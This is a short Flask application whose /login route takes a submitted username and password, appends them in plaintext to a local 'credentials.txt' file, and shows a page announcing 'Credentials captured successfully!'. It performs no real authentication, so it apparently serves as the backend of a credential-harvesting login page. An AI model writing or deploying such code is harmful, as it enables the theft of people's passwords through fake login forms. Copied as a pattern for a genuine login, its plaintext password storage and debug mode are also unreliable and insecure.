from flask import Flask, request, redirect, render_template
import os

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # ✅ Save to a local file named 'credentials.txt' in the same folder
        try:
            with open('credentials.txt', 'a') as file:
                file.write(f'Username: {username}, Password: {password}\n')
            return redirect('/success')
        except Exception as e:
            return f"Error saving credentials: {e}"

    return render_template('login.html')

@app.route('/success')
def success():
    return "<h2>Credentials captured successfully!</h2>"

if __name__ == '__main__':
    app.run(debug=True)
